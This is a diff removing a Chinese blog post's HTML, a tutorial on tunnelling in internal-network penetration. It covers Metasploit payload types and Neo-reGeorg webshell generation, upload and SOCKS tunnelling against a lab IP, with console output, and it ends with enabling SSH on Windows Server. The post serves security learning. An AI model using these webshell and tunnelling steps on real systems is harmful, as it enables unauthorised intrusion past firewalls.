@@ -1,416 +1,62 @@
-
-<!DOCTYPE html><html lang="zh-CN">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
-  
-  <meta name="generator" content="Hexo 7.1.0">
-  <meta http-equiv='x-dns-prefetch-control' content='on' />
-  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
-  <meta name="renderer" content="webkit">
-  <meta name="force-rendering" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-  <meta name="HandheldFriendly" content="True" >
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="theme-color" content="#f8f8f8">
-  
-  <title>内网渗透 03 - 隧道通信 - 妙尽璇机</title>
-
-  
-    <meta name="description" content="网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="内网渗透 03 - 隧道通信">
-<meta property="og:url" content="https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F03-%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/index.html">
-<meta property="og:site_name" content="妙尽璇机">
-<meta property="og:description" content="网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240414130340757.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240414170613793.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240414170703820.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240414170739950.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240414171623552.png">
-<meta property="article:published_time" content="2024-05-16T07:07:30.219Z">
-<meta property="article:modified_time" content="2024-10-06T08:14:34.737Z">
-<meta property="article:author" content="妙尽璇机">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20240414130340757.png">
-  
-  
-  
-  
-
-  <!-- feed -->
-  
-    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
-  
-
-  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
-
-  
-    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
-  
-
-  
-
-  
-  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
-</head>
-<body>
-
-<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
-
-
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/ChangeYourWay/changeyourway.github.io/refs/heads/main/assets/20210722092640_f61bd.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">真理所致，吾心所向</div></a></div></header>
-
-<div class="nav-area">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
-
-
-<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
-</div>
-<div class="widgets">
-
-<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1"><span class="toc-text">内网渗透-隧道通信</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE%EF%BC%9F"><span class="toc-text">什么是隧道协议？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%EF%BC%9F"><span class="toc-text">什么是隧道传输？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">Metasploit 攻击载荷的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Neo-reGeorg-%E5%BB%BA%E7%AB%8B%E6%AD%A3%E5%90%91%E9%9A%A7%E9%81%93"><span class="toc-text">使用 Neo-reGeorg 建立正向隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-Neo-reGeorg"><span class="toc-text">关于 Neo-reGeorg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Neo-reGeorg-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">Neo-reGeorg 使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-SSH-%E7%9A%84%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1"><span class="toc-text">基于 SSH 的隧道通信</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-ssh-%E9%9A%A7%E9%81%93"><span class="toc-text">什么是 ssh 隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-server-2019-%E5%BC%80%E5%90%AF-ssh-%E6%9C%8D%E5%8A%A1"><span class="toc-text">Windows server 2019 开启 ssh 服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">ssh 本地端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali-%E5%BC%80%E5%90%AF-sshd-%E6%9C%8D%E5%8A%A1"><span class="toc-text">kali 开启 sshd 服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">SSH 远程端口转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EarthWorm-%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">EarthWorm 工具的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-text">正向代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E4%BB%A3%E7%90%86"><span class="toc-text">反弹代理</span></a></li></ol></li></ol></li></ol></div></div></widget>
-
-
-
-
-
-
-
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2025/06/02/CTF/2025%20D%5E3CTF%20Web%20WP/"><span class="title">2025 D^3CTF Web WP</span></a><a class="item title" href="/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><span class="title">漏洞篇 - JNDI 注入详解</span></a><a class="item title" href="/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Hessian 反序列化详解</span></a><a class="item title" href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - SnakeYaml 反序列化</span></a><a class="item title" href="/2025/04/30/CTF/2025%20ACTF%20Web%20WP/"><span class="title">2025 ACTF Web 复现</span></a></div></widget>
-</div>
-
-</div></aside><div class="l_main" id="main">
-
-
-
-
-
-<div class="article banner top">
-  <div class="content">
-    
-<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-05-16T07:07:30.219Z">2024-05-16</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-10-06T08:14:34.737Z">2024-10-06</time></span></div></div>
-</div>
-
-    
-    <div class="bottom">
-      <div class="text-area">
-        <h1 class="text title"><span>内网渗透 03 - 隧道通信</span></h1>
-      </div>
-    </div>
-    
-  </div>
-  </div><article class="md-text content"><p>网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。</p>
-<span id="more"></span>
-
-<h2 id="内网渗透-隧道通信"><a href="#内网渗透-隧道通信" class="headerlink" title="内网渗透-隧道通信"></a>内网渗透-隧道通信</h2><p>推荐博客：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/442344972">内网渗透之隧道传输技术</a> </p>
-<h3 id="什么是隧道协议？"><a href="#什么是隧道协议？" class="headerlink" title="什么是隧道协议？"></a>什么是隧道协议？</h3><p><strong>隧道协议</strong>（英语：Tunneling Protocol）是一种网络协议，在其中，使用一种网络协议（发送协议），将另一个不同的网络协议，封装在负载部分。使用隧道的原因是在不兼容的网络上传输数据，或在不安全网络上提供一个安全路径。</p>
-<p>常见的隧道协议包括 SSH，TLS，SOCKS，PPTP 等。</p>
-<h3 id="什么是隧道传输？"><a href="#什么是隧道传输？" class="headerlink" title="什么是隧道传输？"></a>什么是隧道传输？</h3><p>网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。</p>
-<p>防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。常见的隧道列举如下：</p>
-<ul>
-<li>网络层：IPv6 隧道、ICMP 隧道、GRE 隧道</li>
-<li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li>
-<li>应用层：SSH 隧道、HTTP 隧道、HTTPS 隧道、DNS 隧道</li>
-</ul>
-<h3 id="Metasploit-攻击载荷的分类"><a href="#Metasploit-攻击载荷的分类" class="headerlink" title="Metasploit 攻击载荷的分类"></a>Metasploit 攻击载荷的分类</h3><p>攻击载荷（payload）可分为 single、stager、stage 三种。</p>
-<p>1、 <strong>singles（独立载荷）</strong> </p>
-<p>直接植入目标系统并执行相应的程序，如：<code>shell_bind_tcp</code>，<code>meterpreter_reverse_tcp</code></p>
-<p>2、<strong>stagers（传输器载荷）</strong> </p>
-<p>用于目标机与攻击机之间建立稳定的网络连接，与 stages（传输体载荷）配合攻击，该种载荷体积都非常小，如：bind 型和 reverse 型。</p>
-<p>bind 型：需要攻击机主动连接目标端口。</p>
-<p>reverse 型：目标机反向连接攻击机，需要提前设定好连接攻击机的 ip 地址和端口号。</p>
-<p>3、<strong>stages（传输体）</strong> </p>
-<p>在 stagers 建立好稳定的连接后，攻击机将 stages 传输给目标机，由 stagers 进行相应处理，将控制权转交给 stages 。如得到目标机的 shell 或者 meterpreter 控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。</p>
-<p>stager 和 stage 就像 web 入侵里面提到的小马和大马一样，由于 exploit 环境的限制，可能不能一下子把 stage 传过去，需要先传一个 stager ，stager 在 attacker 和 target 之间建立网络连接，之后再把 stage 传过去进行下一步的行动。</p>
-<p><strong>格式</strong></p>
-<p>single payload 的格式为：<code>&lt;target&gt;/&lt;single&gt;</code> ，比如：<code>windows/shell_bind_tcp</code> ；</p>
-<p>stages&#x2F;stagers payload 的格式为：<code>&lt;target&gt;/&lt;stage&gt;/&lt;stager&gt;</code> ，比如：<code>windows/meterpreter/bind_tcp</code></p>
-<h3 id="使用-Neo-reGeorg-建立正向隧道"><a href="#使用-Neo-reGeorg-建立正向隧道" class="headerlink" title="使用 Neo-reGeorg 建立正向隧道"></a>使用 Neo-reGeorg 建立正向隧道</h3><h4 id="关于-Neo-reGeorg"><a href="#关于-Neo-reGeorg" class="headerlink" title="关于 Neo-reGeorg"></a>关于 Neo-reGeorg</h4><p>Neo-reGeorg 是常见的 http 正向隧道工具，是 reGeorg 工具的升级版。增加了很多特性，例如像内容加密、避免被检测、请求头定制、响应码定制、支持 py3 等等。</p>
-<p>有时候我们会发现上传的木马很快就被杀掉了，导致无法获取 shell ，但是目标主机又开启了 web 服务，那么这时就可以建立 http 隧道。</p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
-<h4 id="Neo-reGeorg-使用方法"><a href="#Neo-reGeorg-使用方法" class="headerlink" title="Neo-reGeorg 使用方法"></a>Neo-reGeorg 使用方法</h4><p>进入到 Neo-reGeorg-master 目录下，执行以下命令，生成 webshell ，连接密码为 ‘ shell ’ ：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k shell</span><br></pre></td></tr></table></figure>
-
-<p>这会在当前目录下生成一个 neoreg_servers 文件夹，里面包含了各种类型的 webshell ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240414130340757.png">
-
-<p>在生成的 webshell 中选择目标机对应语言的后门上传即可。</p>
-<p>上传成功后，通过以下命令建立起隧道通信：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k shell -u http://192.168.43.13:8080/tunnel.php</span><br></pre></td></tr></table></figure>
-
-<p>执行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Neo-reGeorg-master]</span><br><span class="line">└─# python3 neoreg.py -k shell -u http://192.168.43.13:8080/tunnel.php</span><br><span class="line"></span><br><span class="line">​      &quot;$$$$$$&#x27;&#x27;  &#x27;M$  &#x27;$$$@m</span><br><span class="line">​    :$$$$$$$$$$$$$$&#x27;&#x27;$$$$&#x27;</span><br><span class="line">   &#x27;$&#x27;    &#x27;JZI&#x27;$$&amp;  $$$$&#x27;</span><br><span class="line">​             &#x27;$$$  &#x27;$$$$</span><br><span class="line">​             $$$$  J$$$$&#x27;</span><br><span class="line">​            m$$$$  $$$$,</span><br><span class="line">​            $$$$@  &#x27;$$$$_          Neo-reGeorg</span><br><span class="line">​         &#x27;1t$$$$&#x27; &#x27;$$$$&lt;</span><br><span class="line">​      &#x27;$$$$$$$$$$&#x27;  $$$$          version 5.2.0</span><br><span class="line">​           &#x27;@$$$$&#x27;  $$$$&#x27;</span><br><span class="line">​            &#x27;$$$$  &#x27;$$$@</span><br><span class="line">​         &#x27;z$$$$$$  @$$$</span><br><span class="line">​            r$$$   $$|</span><br><span class="line">​            &#x27;$$v c$$</span><br><span class="line">​           &#x27;$$v $$v$$$$$$$$$#</span><br><span class="line">​           $$x$$$$$$$$$twelve$$$@$&#x27;</span><br><span class="line">​         @$$$@L &#x27;    &#x27;&lt;@$$$$$$$$`</span><br><span class="line">​       $$                 &#x27;$$$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span><br><span class="line"></span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">  Log Level set to [ERROR]</span><br><span class="line">  Starting SOCKS5 server [127.0.0.1:1080]</span><br><span class="line">  Tunnel at:</span><br><span class="line">    http://192.168.43.13:8080/tunnel.php</span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
-
-<p>默认建立的是 socks5:&#x2F;&#x2F;127.0.0.1:1080 ，所以依然可以通过 proxychains 来利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl http://192.168.43.13:8080</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="基于-SSH-的隧道通信"><a href="#基于-SSH-的隧道通信" class="headerlink" title="基于 SSH 的隧道通信"></a>基于 SSH 的隧道通信</h3><h4 id="什么是-ssh-隧道"><a href="#什么是-ssh-隧道" class="headerlink" title="什么是 ssh 隧道"></a>什么是 ssh 隧道</h4><p>SSH 隧道即 SSH 端口转发，在 SSH 客户端与 SSH 服务端之间建立一个隧道，将网络数据通过该隧道转发至指定端口，从而进行网络通信。SSH 隧道自动提供了相应的加密及解密服务，保证了数据传输的安全性。</p>
-<h4 id="Windows-server-2019-开启-ssh-服务"><a href="#Windows-server-2019-开启-ssh-服务" class="headerlink" title="Windows server 2019 开启 ssh 服务"></a>Windows server 2019 开启 ssh 服务</h4><p>首先需要开启靶机的 22 端口，使其能够进行 ssh 远程连接。</p>
-<p>下方搜索栏搜索并打开 “ 应用和功能 ” ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240414170613793.png">
-
-<p>选择 “ 管理可选功能 ” ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240414170703820.png">
-
-<p>选择 “ 添加功能 ” ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240414170739950.png">
-
-<p>选择 “ OpenSSH 服务器 ” 并安装。</p>
-<p>安装后程序位于：C:\Windows\System32\OpenSSH 。</p>
-<p>执行以下命令即可开启 sshd 服务：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start sshd</span><br></pre></td></tr></table></figure>
-
